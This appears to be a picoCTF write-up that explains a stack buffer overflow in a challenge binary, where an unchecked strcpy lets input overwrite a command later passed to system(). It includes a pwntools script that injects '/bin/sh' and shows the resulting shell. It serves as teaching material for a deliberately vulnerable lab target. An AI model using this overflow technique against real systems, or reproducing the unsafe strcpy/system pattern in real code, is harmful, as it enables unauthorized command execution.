---
title: "Input Injection 1"
date: "2025-12-09"
tags: ["picoCTF", "buffer overflow"]
---

This exercise gives us a binary and its source. A quick look at the code shows it is a simple one:

```c
void fun(char *name, char *cmd);

int main() {
    char name[200];
    printf("What is your name?\n");
    fflush(stdout);


    fgets(name, sizeof(name), stdin);
    name[strcspn(name, "\n")] = 0;

    fun(name, "uname");
    return 0;
}

void fun(char *name, char *cmd) {
    char c[10];
    char buffer[10];

    strcpy(c, cmd);
    strcpy(buffer, name);

    printf("Goodbye, %s!\n", buffer);
    fflush(stdout);
    system(c);
}
```

What stands out is the `system(c)`. If we manage to get `/bin/sh` in there, it gives us a shell. As we can see, we cannot change the string in the variable c directly, since it comes with "uname" in it by default. But we can edit it with a "buffer overflow", in quotes, that happens on this line:

```c
strcpy(buffer, name);
```

This line copies the content of `name`, which we control, into `buffer`. What is wrong with it? They are not the same size. Buffer is only 10 bytes while name is 200. So out of what we type, the first 10 characters go into `buffer` and the rest overflow into `c`. That lets us exploit the program like this, ending up with a `system(/bin/sh)`

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./vuln_patched")

def main():
    io = conn()
    
    padding = b'A' * 10
    bin_sh = b'/bin/sh'

    io.recvline(b'What is your name?\n')
    io.sendline(padding + bin_sh)
    
    io.interactive()

if __name__ == "__main__":
    main()
```

```c
python3 solve.py                                             

    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to **** on port ****: Done
[!] 'keepends' argument is deprecated. Use 'drop' instead.
[*] Switching to interactive mode
Goodbye, AAAAAAAAAA/bin/sh!
$ whoami
ctf-player
$ ls
flag.txt
```

Thanks for reading!